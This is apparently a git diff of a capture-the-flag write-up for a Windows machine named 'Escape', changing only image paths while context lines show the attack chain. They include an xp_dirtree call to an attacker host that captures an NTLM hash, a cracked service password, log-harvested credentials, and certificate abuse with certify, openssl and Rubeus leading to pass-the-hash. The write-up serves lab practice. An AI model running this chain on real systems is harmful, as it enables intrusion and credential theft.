@@ -79,11 +79,11 @@ We can download this file and view it.
 
 This is the file contents:
 
-![](<../../../.gitbook/assets/image%20(4002).png>)
+![](../../../.gitbook/assets/escape-11.png)
 
 The next page contains a guest login for the SQL server. We also find a user called `brandon.brown`, who is likely some kind of database administrator.
 
-![](<../../../.gitbook/assets/image%20(2859).png>)
+![](../../../.gitbook/assets/escape-6.png)
 
 We can use `mssqlclient.py` to connect and interact with this database:
 
@@ -112,7 +112,7 @@ EXEC xp_dirtree '\\10.10.14.7\share'
 
 Afterwards, we would capture an NTLM hash.
 
-![](<../../../.gitbook/assets/image%20(2453).png>)
+![](../../../.gitbook/assets/escape-4.png)
 
 We can try to crack this hash via whatever method available to find this password:
 
@@ -127,7 +127,7 @@ REGGIE1234ronnie (sql_svc)
 
 With these credentials, I was able to login via `evil-winrm`.
 
-![](<../../../.gitbook/assets/image%20(3232).png>)
+![](../../../.gitbook/assets/escape-8.png)
 
 ## Privilege Escalation
 
@@ -137,7 +137,7 @@ This user did not have the flag or any other local privileges. However, since we
 
 Within the `C:\SQLServer\Logs` file, we can find an ERRORLOG file:
 
-![](<../../../.gitbook/assets/image%20(3522).png>)
+![](../../../.gitbook/assets/escape-9.png)
 
 Within that file, we can find some credentials:
 
@@ -148,7 +148,7 @@ Within that file, we can find some credentials:
 
 With these credentials, we can login as `ryan.cooper`.
 
-![](<../../../.gitbook/assets/image%20(160).png>)
+![](../../../.gitbook/assets/escape-3.png)
 
 We can grab the user flag now.
 
@@ -156,11 +156,11 @@ We can grab the user flag now.
 
 I ran a winPEAS scan to enumerate for me. This scan found some certificates on the machine that could potentially be the PE vector.
 
-![](<../../../.gitbook/assets/image%20(2640).png>)
+![](../../../.gitbook/assets/escape-5.png)
 
 We can use `certify.exe` to find out if this is vulnerable. Using `certify.exe find /vulnerable`, we can find one certificate:
 
-![](<../../../.gitbook/assets/image%20(903).png>)
+![](../../../.gitbook/assets/escape-12.png)
 
 We can then request for this certificate using this command:
 
@@ -170,7 +170,7 @@ We can then request for this certificate using this command:
 
 This would output an RSA key and a certificate:
 
-![](<../../../.gitbook/assets/image%20(1324).png>)
+![](../../../.gitbook/assets/escape-2.png)
 
 Afterwards, we can simply use `openssl` to convert this output into a .pfx file:
 
@@ -180,12 +180,12 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 
 Then, transfer the pfx file and `rubeus.exe` to the machine. We can use `asktgt` with the certificate.
 
-![](<../../../.gitbook/assets/image%20(122).png>)
+![](../../../.gitbook/assets/escape-1.png)
 
 Now that we have confirmed this works, we can append `/getcredentials` to the end of the Rubeus command.
 
-![](<../../../.gitbook/assets/image%20(3662).png>)
+![](../../../.gitbook/assets/escape-10.png)
 
 Then, just pass the hash!
 
-![](<../../../.gitbook/assets/image%20(3127).png>)
+![](../../../.gitbook/assets/escape-7.png)
